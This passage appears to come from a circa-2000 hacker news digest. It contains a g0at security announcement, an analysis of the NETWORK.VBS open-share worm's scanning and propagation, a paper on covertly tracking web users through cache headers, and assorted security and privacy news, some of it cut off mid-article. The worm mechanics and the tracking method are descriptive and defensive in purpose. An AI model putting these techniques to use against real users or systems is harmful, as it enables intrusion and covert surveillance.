      falls under your name-space.  Therefore, our evil.nu entry in the .nu
      table looks like this.

      So the IP for mymachine.mycompany.nu has been redirected from its
      192.168.1.1 to 127.0.0.1.  An attacker could conceivably redirect the mail
      servers of a company to his own machine or anything to that effect.

160.0 The dreaded and most pheared return of the infamous GOAT!
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Submitted by Debris 

      From the new website:

      January 1998, an EFNET channel was created, #feed-the-goats. From that 
      emerged a webpage, http://goat.sphix.com. The purpose of that page was to 
      mock, satirize and piss off the 'underground community'. As we grew in 
      popularity, people who were NOT members began defacing websites under the 
      fair name of g0at. Goat security then created a hoax where it was 
      believed, yahoo was cracked. Goat security's popularity skyrocketted after 
      such incidents. 

      Text files, code and advisories were created daily and the archive became 
      rather plentiful, however, problems arose which are described in 
      g0at-quit.txt leading to the end of g0at. The press release states that 
      g0at security will never return. Well it is time to anule that.       G0at 
      security has returned. 

      For many monthes people have been begging for the return of g0at security. 
      We have finally caved in. We are in the process of salvaging old text 
      files, images etc... If you have anything created by us, please visit 
      #feed-the-goats key: blaq, immediatly and speak with       Debris. 

      The 'underground community' has fallen apart. The clueless run amock and 
      give people with direction, goals, and knowledge, a bad name to the 
      general public. The media has the absolute wrong impression of 'hackers' 
      as you most likely have heard many rant about before       (I will not 
      bore you with IRC politics/drama). G0at security is back to start up where 
      we left off. Lightening up the world and spreading joy while pissing most 
      people off. 

      We are not a defacing group, a ./hacking group or anything else similar to 
      that. Do not bug us with question pertaining to this. We want nothing to 
      do with this other then mocking it. 

      Coming soon:  Various new text files, new members, new webdesign, archive 
      of salvaged material.

              Due to recent events, the downfall of g0at security has become 
              imminent. 

              These incidents include:

      - Legal problems of some of our members.       - Recent hacking crack 
      downs launched by many governments. - The recent takeover of our channel, 
      #feed-the-goats (Efnet). - Losing our server due to a sloppy hack by one 
      of our members (/me looks away). - Losing our text files due to our domain 
      being wiped off the server. - Fights and dissapearances of some of our 
      members. - The maturing of our members.

              g0at security hereby announces it's closure. By this we do not 
              mean we are going legit, we are finished. Unlike other groups we 
              most likely will not spawn back.

      [Brief history of g0at security]

              One day in Feb. I believe, ech0 and myself (Debris), decided to 
              irc. ech0 informed me that occasionally hung out in a channel he, 
              himself created called #feed-the-goats. From there, members of a 
              popular group, HcV along with members of Global Hell, began 
              coming. ech0 and myself decided that we wanted to be as elite as 
              our peers in #rootworm, so we made a webpage. The purpose of the 
              page was to mock and satirize hacker culture in general. Our first 
              document entitled "g0at declares war on LoU" mocked the Legion of 
              the Underground's new attempt at becoming legit among a handful of 
              other aspects of their organization.               Our original 
              url (goat.sphix.com) quickly grew in size and popularity, and our 
              channel became more populated. The hacks began soon after, some by 
              members and a lot by non-members. g0at's highpoint came soon after 
              the controversial yahoo hack. Our popularity skyrocketted and the 
              name g0at became known to all (unfortunatly we got all the l33t0s 
              in our channel and wouldn't go away). The fun and games continued 
              up until April, when all the 'incidents' began. Then May was the 
              last straw.

      [Where do we go from here]

              Most members will most likely go their own ways. Many still hang 
              in #feed-the-goatz (our new channel). No more text releases will 
              come from g0at, our webpage will remain down, our archive on 
              attrition.org will stay the same and nothing will be heard of us 
              as a group.

      [Thanks and greets]

              Thanks to all that supported our group and enjoyed the text we 
              wrote to amuse the unintelligent. Greets to all our 12 members, 
              HNN, attrition, net-security, HWA.hax0r.news. JP, for entertaining 
              us for hours with your hacker journalism. And thanks to all the 
              rest.

      
      Finally.... it's been fun. It's been awesome being associated with g0at.

      You can still reach us at g0at@attrition.org for further questions or 
      comments or whatever (I just want email)

      From HNN http://www.hackernews.com/ 
   
      contributed by Brian 
      The National Infrastructure protection Center has identified a new
      self replicating script (hmmm, they don't call it a virus?). The Alert
      issued by NIPC says that the new script will erase hard drives and
      dial 911 emergency systems. The script seems to only effect systems
      running Windows that are setup with file and print sharing.

      VBScript Worm Infects Open Shares Thursday, 24 February 2000

      While inspecting a client's misbehaving computer this evening, I found a 
      little surprise. His StartUp group contained a Visual Basic script which 
      on inspection proved to be a rather simple, self-replicating and 
      self-transmitting worm.

      The client's system had a shared C: drive with no password, cause unknown. 
      The worm had either been placed on his system (no evidence so far of a 
      trojan but we've yet to do thorough scans) or it had arrived by reason if 
      its own action.

      

      How It Works

      The script resides in the StartUp group of the Start Menu and is therefore 
      run at each reboot. The filename is NETWORK.VBS.

      The script creates a log file, C:\NETWORK.LOG, which it erases and 
      re-creates upon each new execution. 

      The script generates a random Class C subnet address and enters it in the 
      log. This address is the first three numbers of the usual four-part IP 
      address. It then steps thru all 255 addresses in that subnet. It blindly 
      attempts to map a shared C: drive at the remote address       to local 
      drive letter J: at each address in turn. It checks each time to verify the 
      successful creation of a drive J: on its host.

      If it has not connected, it repeats the process at the next address in 
      sequence. When it has stepped thru all 255 addresses of the current 
      subnet, it creates another random subnet address, enters it in 
      NETWORK.LOG, and continues attempting connections on the new       subnet.

      If it succeeds in mapping a remote drive, the script then attempts to copy 
      itself to a series of likely locations on that drive.

      Its first act is to place a copy of itself in the root directory of drive 
      J:. If the file makes the journey, the script logs its success.

      Then it copies itself to the following folders, most of them targeting the 
      StartUp group which will cause persistent execution of the script at every 
      reboot:

      j:\windows\startm~1\programs\startup\       j:\windows\ j:\windows\start 
      menu\programs\startup\ j:\win95\start menu\programs\startup\ 
      j:\win95\startm~1\programs\startup\ j:\wind95\

      The script then disconnects, effectively removing drive J:.

      It then goes back to work "scanning" addresses without cease.

      Incidentally, if the host system has a drive using the letter J: the 
      script will fail to propagate.

      Here are the contents of NETWORK.LOG as found on my client's system:

      Log file Open       Subnet : 211.203.133.0 Subnet : 203.251.228.0 Subnet : 
      201.244.147.0 Subnet : 204.97.180.0

      This particular log reflects the fact that the worm had no success 
      transferring itself during its last session. The system had been rebooted 
      about two hours or so before, and had been offline most of that time. The 
      script had tried only about 1000 addresses in that       period. This 
      small number was presumably because of the delay, usually about 10 
      seconds, resulting from a connection attempt to a nonexistent host.

      

      The Script

      My analysis is in blue text.

      Note: A single small alteration of this code renders it impotent. The 
      remainder has been left intact for the benefit of well-intentioned

      This is the first worm I've seen that was targeted to take advantage of 
      open (sans password) shares. I have no idea whether similar exploits exist 
      nor whether anyone else has spotted this particular creature. (25 Feb: I 
      now know that this worm has been known to       AV vendors for several 
      days. Most of them have issued patches for its detection.)

      In my opinion, any working copy of this worm is almost certain to 
      replicate itself on several other machines before it's detected by the 
      user, so it is probably spreading at a steady -- perhaps even exponential 
      -- rate.

      It's impossible to estimate the incidence of open shares with certainty; 
      but I've poked around looking for them a time or two in an effort to 
      estimate them; so I think I can hazard an educated guess. I'd say one or 
      two addresses in a thousand harbor a system with open       shares, and a 
      significant percentage of those will permit access to the entire C: drive. 
      While online this worm might easily scan several thousand potential 
      victims in the course of a few hours, which means that an undetected worm 
      residing on a system that's online several hours a day has a high 
      probability of replicating itself something like once every day or two.

      The capability to run these scripts is installed with Internet Explorer 5. 
      I'm not sure about IE4. I believe this means that Win98 systems are much 
      more likely than Win95 machines to have the Windows Script Host installed. 
      So the script won't run on a significant       proportion of the "legacy" 
      systems which were more easily misconfigured for open shares. This could 
      reduce its rate of propagation.

      25 Feb: UseNet reports indicate that this worm can cause slowdowns on a 
      LAN. It stands to reason! As reported by NAI at 
      http://vil.nai.com/vil/vbs98477.asp, the effect of the worm's simultaneous 
      action on numerous systems on a network may       overload or crash 
      servers which receive a flood of DNS requests resulting from the script's 
      activity.

      Note that in systems with Windows Script Host installed, there will be a 
      file named NETWORK.VBS in the Windows directory. Don't be alarmed. This is 
      a harmless sample script. If you're infected, the bad guy will be in the 
      StartUp folder and in the root directory.

      Removal

      To kill the script, move it out of the StartUp folder and reboot. If 
      Windows won't allow this, reboot to MS-DOS (don't just open a DOS window) 
      and type this command:

      ren \windows\startm~1\programs\startup\network.vbs network.txt

      Hit Enter. If no error message displays, it worked. Now when you restart 
      Windows, the script will not run, instead it will open up for examination 
      in Notepad. If it's not identical to the one I've quoted above, I'd 
      appreciate it if you'd send me a copy.

      In Sum

      The worm script does nothing nefarious aside from taking up bandwidth on 
      the Net link and consuming some processing power on the host system. But 
      it may have been responsible for some annoying lockups that were observed 
      on my client's system.

      Fortunately it doesn't phone home, nor otherwise serve to advertise the 
      victim's open shares. But it could easily do so with simple additions. So 
      it illustrates a rather serious potential for exploit. In fact, given 
      history, I consider it a positive certainty that more hostile       
      versions of this thing will appear.

      A worm like this with phone-home or broadcast features might spread far 
      and wide, and report on open shares on a huge scale. It would probably lay 
      a lot of people open to near-certain intrusion. It should stand as a grim 
      reminder of the potential seriousness of open       shares.

      Anyone who simply ensures they're not sharing their entire C: drive with 
      write permission on the Internet link has nothing to fear from this worm. 
      If it writes to a shared subdirectory or to another drive, it won't run.

      For more on open shares and their solutions, see my page titled File And 
      Printer Sharing And The Internet.

      I am suddenly very interested in this sort of scripting. If you too would 
      like to investigate it in greater detail, here are some useful links:

           constraints. This is a problem for user privacy against which 
           browsers currently provide little protection. 

      introduction

      Some people would like to be anonymous as they use the web, and other 
      people would like to prevent anonymous access for various reasons. 
      Consider, for example, an internet marketing company that wants to chain 
      together visits to various web sites by a user so as       to build a 
      fuller profile of their interests and usage patterns. Conversely, a web 
      user might not wish to leak such information to a site because they are 
      looking at controversial information, desire a good negotiating position, 
      or see privacy as a moral right. 

      An arms race in techniques for providing and stripping away anonymity has 
      developed over the years. This black paper discusses what is believed to 
      be a new technique for tracking clients and possible responses. 

      problem statement

           Alice is browsing the web; Bob runs a number of otherwise-unrelated 
           web servers. Alice makes several requests to Bob's servers over time. 
           Bob would like to tie together as many as possible of the requests 
           made by Alice to learn more            about Alice's usage patterns 
           and identity: we call this identifying the request chain. Alice would 
           like to access Bob's servers but not give away this information.

      There are many perfectly good reasons why in a particular situation B 
      might want to know A's identity, or at least a unique pseudonym. If B 
      explains the reasons why tracking is required, then A can consent to and 
      allow tracking in various ways. There are several       less savory 
      possibilities when A does not consent to the tracking or does not realize 
      that a single chain can be found across apparently unrelated servers 
      controlled by B. 

      The scenario poses an interesting information-theory and game-theory 
      challenge in anonymity. It is also immediately practical: there is a good 
      deal of development being done in aid of both Alice and Bob. 

      existing approaches

      cookies

      The standard approach for associating user requests across several 
      responses is the HTTP `Cookie' state-management extension. The Cookie 
      response header allows a server to ask the client to store arbitrary short 
      opaque data, which should be returned for future       requests of that 
      server matching particular criteria. Cookies are commonly used to store 
      per-user form defaults, to manage web application sessions, and to 
      associate requests between executions of the user agent. 

      The user agent always has the option to just ignore the Set-Cookie 
      response header, but most implementations default to obeying it to 
      preserve functionality. Cookies can optionally specify an expiry time 
      after which they should no longer be used, that they should       persist 
      on disk between client session, or that they should only be passed over 
      transmission-level-secure connections. 

      The privacy implications of cookies have been extensively discussed, and 
      several problems have been found and recitified in the past. One example 
      of privacy compromise through cookies is the use of cookies attached to 
      banner images downloaded from a central       banner server: the same 
      cookie is used within images linked from several servers, and so the user 
      can be tracked as they move around. 

      other approaches

      An obvious means to associate requests is by source IP address. Over the 
      short term this will generally work quite well, as a client is likely to 
      use a single IP address during a browsing session. Even then it is 
      complicated by proxies acting for multiple clients, network       address 
      translation, or multiuser machines. Over a longer term, the information is 
      convolved by dynamically-assigned IPs, mobile computers moving between 
      networks, dialup pools and the like. Indeed, cookies were proposed in 
      large part to allow legitimate stateful applications to cope with the 
      impossibility of uniquely identifying users by IP address. 

      Within a single site, state may be maintained by generating dynamic URLs 
      that include session identification either within the hostname 
      (http://d9128309812.crackmonkey.org/) or path 
      (http://crackmonkey.org/d213213213/faq.html). However,       this does not 
      allow tracking between sites and causes a significant loss of 
      functionality because URLs cannot be shared between users or bookmarked. 

      Single links can be identified by the HTTP Referer header. There are some 
      limitations here, however: this only identifies the immediately preceding 
      resource, and the link is lost if the user re-enters a URL by hand or 
      retrieves it from a bookmarks file. 

      countermeasures

      Users caring to preserve their privacy have taken various countermeasures 
      against these techniques. 

      To reassure end-users about cookie privacy issues, user agents such as 
      Netscape Navigator, Microsoft Internet Explorer and Lynx allow the user 
      some control. The most basic control is to enable or disable cookies 
      altogether; some user agents allow this to be       specified for 
      particular domains. There may be more fine-grained controls, such as only 
      accepting cookies from the same server as the top-level page currently 
      viewed and not from servers for subsidiary requests such as images or 
      frames. 

      The broadest protection is afforded by the use of a proxy local to the 
      browsers machine, such as Internet Junkbuster. This software rewrites the 
      request to strip out identifying browser and cookie information, in 
      addition to attempting to remove advertising banners. 

      Various proxying solutions are available to prevent identification by IP 
      address, such as anonymizer.com and CROWDS. 

      A similar but more powerful attack is possible through the 
      cache-management headers proposed in draft-mogul-http-delta-02. 

      caching in http

      To make access faster and reduce network usage, browsers generally keep a 
      copy of resources such as pages and images that they download. When a 
      client has a cached copy of a page, it can decide either to use the cached 
      copy as is, or to send a request to the       server to check that it is 
      up-to-date. 

      When the client sends a request for the copy it has in cache, it sends a 
      conditional request describing the cached copy and asking the server to 
      only transfer the body of the resource if it is newer than the cached 
      copy. 

      The most common means of checking this currently in use is the 
      Last-Modified date header. The server supplies a date in the metadata of 
      the response, and the client returns the same date when sending a 
      conditional request. 

      Other techniques, such as checking the length of the resource body, its 
      MD5 hash, and a unique ETag cookie have also been used. 

      the meantime exploit

      The fundament of the meantime exploit is that the server wishes to `tag' 
      the client with some information that will later be reported back, 
      allowing the server to identify a chain. Cookies are a good approach to 
      this, but their privacy implications are well known and so       Bob 
      requires a more surreptitious approach. 

      The HTTP cache-control headers are perfect for this: the data is provided 
      by the server, stored but not verified by the client, and then provided 
      verbatim back to the server on the next matching request. 

      Two headers in particular are useful: Last-Modified and ETag. Both are 
      designed to help the client and server negotiate whether to use a cached 
      copy or fetch the resource again. 

      The general approach of meantime is that rather than using the headers for 
      their intended purpose, Bob's servers will instead send down a unique tag 
      for the client. 

      Last-Modified is constrained to be a date, and therefore is somewhat 
      inflexible. Nevertheless, the server can reasonably choose any second 
      since the Unix epoch, which allows it to tag on the order of one billion 
      distinct clients. 

      ETag allows an arbitrary short string to be stored and passed. It is not 
      so commonly implemented in user agents at the moment, and so not such a 
      good choice. 

      In both cases the tag will be lost if the client discards the resource 
      from its cache, or if it does not request the exact same resource in the 
      future, or if the request is unconditional. (For example, Netscape sends 
      an unconditional response when the user presses       Shift+Reload.) Bob 
      has less control over this than he has with cookies, which can be 
      instructed to persist for an arbitrarily long period. 

      The date is only sent back for the exact same URL, including any query 
      parameters. By contrast, cookies can be returned for all resources in a 
      site or section of a site. This makes Bob's job a little harder. 

      Bob therefore should make sure that all pages link to a small common 
      resource: perhaps a one-pixel image. This image is generated by a script 
      that supplies and records a unique timestamp to each client, and records 
      whatever is already present. 

      intermediate proxies.

      The presence of proxy caches between the client and the server will 
      complicate the situation for Bob, because if the proxy holds a copy of the 
      resource it might satisfy the request locally or change the cache control 
      criteria. In the extreme case, if the proxy does all       the caching and 
      the client none, then Bob will identify all requests through that proxy as 
      a single chain. 

      Bob need not despair. Proxy usage is still quite low, and there are some 
      indications that people concerned about anonymity will not route their 
      requests through a proxy that might log them. 

      In fact, a meantime exploit is entirely possible if Bob controls an 
      intermediate proxy. This seems not to be so much of a threat in practice, 
      however, because proxies are most commonly controlled by the 
      administrators of a local network who already have considerable       
      power to trace users. 

      If intermediate proxies or clients implement expiry heuristics then this 
      can interfere with tracking, but not irredeemably so. 

      demonstration

      This very simple demonstration places a tag in your browser's cache, and 
      allows you to associate a short string with it on on our server. It should 
      persist as long as the record remains in your browser's cache. 

      If there are several caches on your system, perhaps for different use 
      profiles, or for different user agents, then each will get one tag. It 
      will not be confused by other people accessing the system from the same 
      machine, by use of different IP addresses, or by cookies       being 
      disabled. 

      The demonstration will be easier to understand if your browser is set to 
      `Cache is compared to network on every request'. If that setting is not 
      checked, your access will still be tracked but the fields of the page may 
      not seem to update. 

      This will not work in Lynx. 

      track me 

      source code 

      results

      This code is a demonstration of the principle, rather than a full 
      implementation of tracking. Nevertheless: 

           It works quite reliably against Netscape.            Lynx apparently 
           never sends conditional requests, and so is safe. Junkbuster does not 
           prevent tracking. anonymizer.com seems to keep a cache on their 
           servers and rewrites the page as it passes through, so it seems to be 
           safe: all anonymizer.com users appear as one. 

      implications

      Anonymizing software should probably strip out all cache headers. 
      Unfortunately this will slow down access and waste network bandwidth, but 
      it seems necessary that the client should not return any information to 
      the server if it is to preserve anonymity. 

      Possibly Alice should ask her client to never refresh cached requests 
      unless explicitly requested: this will maintain performance for the common 
      case of unchanged pages. When the page must be refreshed, she should be 
      careful that no information about the previously       cached copy is 
      emitted. 

      If all of Alice's requests were directed through an anonymizing proxy 
      crowd it would be harder to associate the tagged requests with her other 
      activities, but not infeasible. 

      Clients could try to manipulate the modification times to give Bob less 
      room to move: for example, they could round off the time to the lowest 
      minute, and could clip times to be no more than a year from the current 
      date. But this still leaves several bits of the value       under Bob's 
      control: even separating users into equivalence classes based on where 
      they first accessed this site might be interesting, for example. 

      Designers of future protocols should consider similar tagging security 
      issues. For example, although ETags allow better cache consistency 
      problems than Last-Modified headers, they make tracking even easier by 
      allowing the server to store arbitrary data on the client.

      references

           There was some discussion of problems with Last-Modified on the HTTP 
           Working Group mailing list, but it seems they didn't identify the 
           privacy problems.

                  The rush to release Stephen King's e-book
                  compromised piracy safeguards.

                  by Christine McGeever, Computerworld 
                  April 3, 2000, 9:09 a.m. PT 

                  Now that pirated versions of the popular 66-page
                  electronic novella by Stephen King, "Riding the Bullet,"
                  have surfaced, the electronic book's distributor,
                  Glassbook, will release a more secure version of its
                  e-book reader. 

                  Glassbook President Len Kawall says that the updated
                  version will be available next week, equipped with
                  security features that should have been present for the
                  King book release. But in the hurry to get the book out
                  to market, a less robust reader was used. 

                  As a result, Kawall says, someone "chiseled in" to the
                  content of the book after downloading and opening it in
                  the reader. He adds that encryption technology used to
                  transmit the book securely on the Internet was not
                  compromised. 

                  However, the version of the book reader used with
                  King's novella was vulnerable from the start, and both
                  Glassbook and "Riding the Bullet" publisher Simon &
                  Schuster knew it. Kawall says that Glassbook wanted
                  to distribute the book with a reader that had 64-bit
                  encryption, but couldn't make the publisher's deadline
                  with the updated reader. 

                  In addition, the specification used to secure the book in
                  transmission hasn't yet been formalized by the
                  standards group behind it, the Book Industry Study
                  Group. The Electronic Book Exchange specification
                  hasn't been presented in a finished draft, nor has it
                  been presented in any manner for industry review,
                  according BISG spokesperson Sandra Paul. 

                  The BISG was formally announced on March 28, two
                  weeks after the King book was released. 

                  Kawall adds that "Simon & Schuster absolutely
                  understands" how a security breach could occur and
                  that the industry "has learned to live with piracy." He
                  cites the 400,000 to 500,000 legitimate copies of the
                  book in distribution compared to what he estimates to
                  be "a few" pirated copies. 

                  Adds Kawall, "It is not the end of e-books. Our job is to
                  make it more pleasurable to purchase the product from
                  a legitimate source." 

                  Meantime, Glassbook has announced the new reader
                  and posted on its Web site "aggressive steps" it plans
                  to take "to stem e-book privacy." The steps outlined
                  include forming a full-time antipiracy support team that
                  will search the Internet for pirated material, work with
                  the publisher to remove illegally published material, and
                  cooperate with the FBI and international authorities to
                  monitor, track, and report suspected digital piracy and
                  copyright infringement.

              Man faces charges of

         A former Eagle Scout and son of a former Mobile
         philanthropist faces federal charges for alleged computer
         hacking. 

         Brian Michael Jacobs, 23, of Mobile was arraigned by
         U.S. Magistrate Bert W. Milling Jr. last Wednesday on
         charges that on May 16, 1999, he "knowingly transmitted
         code and commands to the computer of an Internet
         Service Provider (ISP)" which resulted in more than
         $5,000 in damage. The combined charges carry up to five
         years in federal prison and $250,000 in fines. 

         In the computer world, Jacobs assumed the code name
         Blaxthos, court documents state.

         A 1995 Murphy High School graduate and Eagle Scout,
         Jacobs briefly attended Auburn University before leaving
         in March 1996. Jacobs was convicted on state charges in
         Lee County in 1996. But Ronald Myers, the former
         prosecutor on the case, said that he could not comment
         further on the charges because Jacobs was a youthful
         offender at the time. 

         His father, Michael Jacobs, who had worked as executive
         director of the Medical Society of Mobile County Inc.,
         died in 1997. 

         Court documents list Jacobs as a "permanent" resident of
         Miami, Fla., where he is working. But a Mobile address
         also was listed in court documents. 

         Milling, however, released him with the requirements that
         he "refrain from any use or unlawful possession of a
         narcotic drug and other controlled substances" and that he
         "undergo random urinalysis; also drug and alcohol
         treatment as deemed appropriate." 

         At Wednesday's hearing, Jacobs' attorney, Arthur
         Madden, mentioned a dispute with the U.S. attorney's
         office about failing to provide documents it had against
         Jacobs. 

         "The government has had eight months to get ready to do
         this," Madden told Milling. 

         The court scheduled Jacobs' case for May.

     DAILY BRIEFING

     Federal Web site security called
     weak

     By Juliana Gruenwald, National Journal's Technology Daily

     While many of the government's computer systems are secure,
     federal agencies' Web interfaces with the public are the weakest
     links, two security experts told lawmakers Monday. 

     Members of the House cybersecurity team and other lawmakers
     toured computer security firms in Northern Virginia Monday,
     including online security firm Global Integrity. Company
     President Dan Wooley and William Marlow, the company's
     executive vice president, also cited the need to provide
     companies with some exemption from the Freedom of
     Information Act to ensure that proprietary information that they
     share with the government about a cyberattack is not revealed.
     Reps. Tom Davis, R-Va., and James Moran, D-Va., are
     expected soon to introduce a bill addressing that issue.

     In the area of computer security, House cyber team leader J.C.
     Watts, R-Okla., chairman of the House Republican Conference,
     and four other House members sent a letter Friday to Rep.
     Harold Rogers, R-Ky., chairman of the House Appropriations
     Commerce, Justice and State Subcommittee, requesting that
     $250 million be appropriated to fund an information security pilot
     program at five agencies. The agencies include the Defense and
     State Departments and the Environmental Protection Agency,
     which has been criticized for its information security practices. 

     "Governmentwide policies for the management of programs that
     support the cost-effective security of federal information
     systems remain inadequate," Watts wrote along with Davis and
     Reps. Pete Sessions, R-Texas, James Rogan, R-Calif., and Bill
     McCollum, R-Fla. 

     Rep. Bob Goodlatte, R-Va., said he would like to see the Clinton
     administration hold an international summit on cybersecurity. If
     the administration fails to act, he suggested that Congress may
     have to pass a resolution urging the president to take such an
     action. 

     "There's a great need for greater international cooperation" on
     the issue, Goodlatte said. 

     On the tour, Wooley said denial of service attacks and damage
     to a company's reputation were the biggest potential losses for
     companies when they are attacked. An employee showed a
     group of lawmakers how a hacker might break into a bank Web
     site and potentially steal money from an account.

      Germany eyes Web security
      After almost two years of study, a secret
      committee of the German government has
      concluded that Internet attacks will supplant
      military conflicts in the coming years, according
      to German magazine "Der Spiegel." The group,
      which encompasses several ministries, security
      forces and the chancellorship warned that attacks
      could interfere with sites belonging to the military
      as well as key civil institutions such as the police,
      power utilities and health services. "There is no
      more national territory" that can be defended
      militarily, the group reports; it went on to propose
      a "strike force" within the German federal office
      for security that could address attacks on critical
      sites. -- Susanne Rieger, ZDNet Germany;

      Can Net Infrastructure
      Protect Privacy? 
 
      Privacy conference panelists debate control
      implications of domain name system.

      As the world grapples with how and whether to control
      the Internet, a model surfaced at the Computers,
      Freedom, and Privacy conference held in Toronto this
      week to let control--and individuals' civil liberties--flow
      not from legislation but from the Net's infrastructure
      itself.
 
      "We're trying to use technology to build a civil-liberties
      infrastructure," says Lenny Foner of the Media Lab at
      Massachusetts Institute of Technology.
 
      One sticky Internet issue with control implications is
      the domain name system, which provides the
      human-friendly monikers such as "Amazon.com" and
      their corresponding numerical Internet Protocol
      addresses.
 
      "Whoever gets to decide who receives the names gets
      to decide, in a sense, how visible" people and
      companies are on the Internet, MIT's Foner says.
 
      Currently the company most associated with the
      domain name system, Network Solutions, manages
      top-level domain servers, including .com, .net, and .org,
      under a four-year contract awarded last November by
      the U.S. Department of Commerce. The Herndon,
      Virginia-based Network Solutions is not the sole
      naming player in the system, but the vendor's clout is
      evident from the $21 billion stock deal that VeriSign
      worked out last month to acquire Network Solutions.
 
      Thwarting the Squatters
 
      Panelists contemplated how to confound that
      near-centralized control of the Net while retaining its
      operational value.
 
      One possibility would be to permit multiple names,
      Foner says. Such a move would cut into the power of
      an organization to grant the name and would also
      thwart "land grabs," where squatters purchase all
      possible permutations of a company's name, Foner
      adds.
 
      An initial search for a specific company's Web site
      using the current convention, for example, "ibm.com,"
      might list multiple, dramatically different sites.
      However, once the IBM site was reached, its location
      could be cached on the user's computer, so that a
      second query on "IBM" would quickly bring the user to
      that same site, according to Foner.
 
      But one panelist was concerned that relying on caches
      was not in keeping with the way people use computers.
      Increasingly, users access the Internet from many
      sources, not from just their home or work PC, says
      Lance Cottrell of Anonymizer.com. "People will have an
      expectation that, if they've always typed in one name to
      get to a place," they will always be able to use that
      name, Cottrell says.
 
      Another panelist said that a system in which names
      were not unique would never pass muster with powerful
      electronic commerce players.
 
      "They're going to hate the idea that a user could type in
      'AT&T' or 'British Telecom'" and not get to those
      corporate sites, says Jonathan Weinberg of Wayne
      State University. "Major e-commerce players are not
      going to use this."
 
      Important e-commerce companies are not the only
      ones who value having unique and easily reachable
      names, according to Phil Zimmermann, the creator of
      the encryption software Pretty Good Privacy.
 
      "I would like to be able to know that if I type in
      'barnesandnoble.com' that I get Barnes and Noble,"
     Zimmermann says.

      Cryptos Try to Solve Enigma Crime by Lynn Burke 

      3:00 a.m. Apr. 5, 2000 PDT       Whoever stole the rare, World War II 
      secret decoder known as the Abwehr Enigma is going to have a tough time 
      selling it on the online black market. 

      Thats what cryptology enthusiasts are saying after the famous decoding 
      machine used during the war to protect German secret messages was taken 
      from its home in a glass display case at Bletchley Park Trust in London on 
      April 1. 

      "We hope that if the Internet community gets behind it, it will be 
      impossible to sell the machine on the public market," said Christine 
      Large, the trust's director. 

      Because the machine was stolen on April Fool's day, trust officials say 
      its theft may have been a prank. 

      "If it was just an April Fool, we hope our Abwehr Enigma turns up soon," 
      Large said. 

      But as long as the decoder remains at large, active cryptologists who 
      revere the analog antique are getting the word of its disappearance out 
      over the Web, hoping to catch a thief who might try and sell the item 
      online. Leading the       effort is the Crypto Simulation Group, a small 
      group of cryptologists who specialize in the Enigma machines. 

      "In addition to our normal activities in cryptologic research, we have set 
      up Web pages ... to broadcast to as large a base as possible the features 
      of this rather unique piece of historical cipher equipment in the hope 
      that the thieves       will be caught in the act of attempting to dispose 
      of it," said David Hamer, one of the group's members. 

      Hamer, a retired historian living in New Jersey and one of the world's 
      foremost Enigma experts, said it's important to rescue the machine because 
      it is one of only two of its kind known to still exist. The other one is 
      housed in the       National Cryptologic Museum at Fort Meade, Maryland. 

      According to a spokesman at the museum, 200 "G" Enigmas were issued to the 
      German army high command during World War II for an unknown "special 
      purpose." But no one seems to know where most of those have ended up, 
      making       the stolen machine all the more valuable. 

      "This Abwehr Enigma is a close to unique variant," and it's likely to be 
      worth quite a sum of cash, Hamer said. "Even standard service Enigmas are 
      rare enough to command prices in the tens of thousands of dollars," he 
      said. 

      Since the announcement of the theft, several sites dedicated to cryptology 
      have added a link to this urgent message about the machine's theft. 
      Message boards have been frenetic with hundreds of postings about the 
      machine's       theft. 

      The decoder, which looks like little more than an old-fashioned typewriter 
      with a counter above the keyboard that resembles a car odometer, was given 
      to the museum in 1998 by Britain's intelligence agency, the Government       
      Communications Headquarters. 

      According to the U.S. National Security Agency, cryptology was key to the 
      success of the Allies in World War II. 

      "Information from decrypted Enigma messages (not necessarily the Abwehr) 
      was used time after time to outmaneuver German forces," said NSA 
      spokeswoman Judi Emmel. 

      "Losing this Enigma is a significant loss to the historic record of World 
      War II cryptology."

      DoubleClick Wins for Losing by Declan McCullagh 

      3:00 a.m. Apr. 6, 2000 PDT       TORONTO -- Say what you will about 
      liberal privacy advocates, but they sure do know how to have a good time. 

      Four of them dressed up as malicious characters from the Star Wars and 
      Austin Powers movies to hand the second annual "Big Brother" awards to 
      miscreant government agencies and large corporations on Wednesday evening. 

      The bald director of Privacy International, Simon Davies, was a 
      near-perfect Dr. Evil and master of ceremonies during the Computers, 
      Freedom, and Privacy conference. 

      The winner of the corporate invader award: DoubleClick, a company whose 
      now-legendary privacy missteps drew fire earlier this year. 

      Commerce Secretary William Daley won the worst government official award, 
      beating out the Federal Trade Commission. The Commerce Department has 
      hosted direct marketing conferences and oversees U.S. export controls of       
      encryption technology. 

      "We had a very tough time determining who would have the lifetime 
      achievement menace award," said Dave Banisar, a fellow at the Electronic 
      Privacy Information Center. 

      "To truly be a lifetime menace, you can't just be a flash in the pan. 
      DoubleClick has only been around for a few years." 

      An anonymous CFP conference-goer costumed as Star Wars' Darth Vader 
      accepted the award on behalf of credit reporting firm Transunion to 
      applause from the roughly 150-person audience. 

      Oddly enough, Transunion beat out the National Security Agency, which 
      championed the government-backdoored Clipper chip in the early 1990s and 
      spent decades trying to stifle academic encryption research in the United 
      States. 

      Winners of the pro-privacy Brandeis Award, named after U.S. Supreme Court 
      Justice Louis Brandeis, included Beth Givens of the Privacy Rights 
      Clearinghouse, and Richard Smith, who regularly exposes privacy violations 
      in consumer       software products. 

      Previous Big Brother winners have included Microsoft and the FBI. 

      The CFP conference continues through Friday.

      FBI agent: I am Big Brother

      Pro-privacy groups might consider him 'the enemy,' but Paul George 
      counters: 'There are worse things than having your privacy violated ... 
      like murder.'

       
      By Robert Lemos, ZDNet News UPDATED April 6, 2000 10:36 AM PT 

      TORONTO -- Can effective law enforcement and personal privacy coexist?       
      Law enforcement officials and privacy advocates faced off in a panel 
      discussion Wednesday over the issue of the trade-offs between security and 
      privacy at the 10th annual Computer, Freedom and Privacy 2000 Conference 
      in Toronto.

      
      "There are reasons law enforcement should and does have the power to 
      arrest and to search," said Paul George, supervisory special agent for the 
      Michigan bureau of the FBI. "There are worse things than having your 
      privacy violated ... like murder."

      George debated fiercely, but politely, with privacy advocates on the need 
      for privacy invasive investigative techniques -- such as wiretaps, 
      searches and Internet tracking -- to fight crime. In fact, recognizing 
      that many at the conference consider him to be "the enemy," George called 
      himself "the Big Brother in Michigan."

      
       'If there is going to be a Big Brother in the United States, it is going 
       to be us. The FBI.' -- FBI Supervisory Special Agent Paul George

       
      Few here doubt that privacy has been a casualty of the steady drive toward 
      computerization and the Internet economy.

